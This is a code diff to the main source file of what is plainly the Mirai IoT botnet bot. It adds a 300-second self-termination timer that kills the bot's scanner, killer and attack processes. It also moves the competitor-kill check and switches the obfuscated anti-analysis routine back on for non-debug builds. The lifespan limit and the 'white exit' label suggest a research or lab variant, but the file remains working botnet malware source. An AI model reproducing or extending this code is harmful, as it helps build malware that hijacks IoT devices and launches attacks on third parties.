@@ -13,6 +13,7 @@
 #include <sys/ioctl.h>
 #include <time.h>
 #include <errno.h>
+#include <sys/time.h>
 
 #include "includes.h"
 #include "table.h"
@@ -31,6 +32,8 @@ static void establish_connection(void);
 static void teardown_connection(void);
 static void ensure_single_instance(void);
 static BOOL unlock_tbl_if_nodebug(char *);
+//void timer_handler(int signum,int pgid);
+void timer_handler(int signum);
 
 struct sockaddr_in srv_addr;
 int fd_ctrl = -1, fd_serv = -1;
@@ -38,6 +41,31 @@ BOOL pending_connection = FALSE;
 void (*resolve_func)(void) = (void (*)(void))util_local_addr; // Overridden in anti_gdb_entry
 
 ipv4_t LOCAL_ADDR;
+int pgid = 0;
+
+//void timer_handler(int signum,int pgid) {
+void timer_handler(int signum) {
+    printf("[Life Span] white exit\n");
+    //WE NEED THIS IF STATEMENT???
+    //if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdsetrd))
+    //{
+                struct sockaddr_in cli_addr;
+                socklen_t cli_addr_len = sizeof (cli_addr);
+
+                accept(fd_ctrl, (struct sockaddr *)&cli_addr, &cli_addr_len);
+
+    #ifdef DEBUG
+                printf("[main] Detected newer instance running! Killing self\n");
+    #endif
+    #ifdef MIRAI_TELNET
+                scanner_kill();
+    #endif
+                killer_kill();
+                attack_kill_all();
+                kill(pgid * -1, 9);
+                exit(0);
+    //}
+}
 
 void check_and_kill_mirai()
 {
@@ -101,6 +129,8 @@ static void segv_handler(int sig, siginfo_t *si, void *unused)
 }
 #endif
 
+
+
 int main(int argc, char **args)
 {
     char *tbl_exec_succ;
@@ -108,7 +138,7 @@ int main(int argc, char **args)
     char id_buf[32];
     int name_buf_len;
     int tbl_exec_succ_len;
-    int pgid, pings = 0;
+    int pings = 0;
 
 #ifdef DEBUG
     sigset_t sigs;
@@ -138,9 +168,10 @@ int main(int argc, char **args)
 #endif
 
 #ifdef DEBUG
-    printf("DEBUG MODE YO\n");
+    printf("DEBUG MODE YO and this is compiled in bins\n");
 
     sleep(1);
+
 
     struct sigaction sa;
 
@@ -157,7 +188,7 @@ int main(int argc, char **args)
         perror("sigaction");
 #endif
     check_and_exit_self();
-    check_and_kill_mirai();
+    //check_and_kill_mirai();
 
     LOCAL_ADDR = util_local_addr();
 
@@ -222,6 +253,28 @@ int main(int argc, char **args)
         scanner_init();
 #endif
 #endif
+        check_and_kill_mirai();
+
+    //////////struct sigacton saが変な干渉しそう→関数の位置を移動した///////////
+    struct sigaction sat;
+    struct itimerval timer;
+    // タイマーハンドラの設定
+    //sa.sa_handler = timer_handler(pgid);
+    sat.sa_handler = timer_handler;
+    sigemptyset(&sat.sa_mask);
+    sat.sa_flags = 0;
+    sigaction(SIGALRM, &sat, NULL);
+    // タイマーの設定
+    //timer.it_value.tv_sec = 60; // 最初の実行までの時間(秒)
+    //timer.it_value.tv_sec = 180; // 最初の実行までの時間(秒)
+    timer.it_value.tv_sec = 300; // 最初の実行までの時間(秒)
+    timer.it_value.tv_usec = 0; // 最初の実行までの時間(マイクロ秒)
+    timer.it_interval.tv_sec = 1; // 繰り返し実行する間隔(秒)
+    timer.it_interval.tv_usec = 0; // 繰り返し実行する間隔(マイクロ秒)
+    // タイマーの開始
+    setitimer(ITIMER_REAL, &timer, NULL);
+////////////////////////////////////////////////////////
+
 
         while (TRUE)
         {
@@ -582,8 +635,8 @@ static BOOL unlock_tbl_if_nodebug(char *argv0)
     }
     fold %= (sizeof (obf_funcs) / sizeof (void *));
     
-//#ifndef DEBUG
-#ifdef DEBUG
+#ifndef DEBUG
+//#ifdef DEBUG
     (obf_funcs[fold])();
     matches = util_strcmp(argv0, buf_dst);
     util_zero(buf_src, sizeof (buf_src));
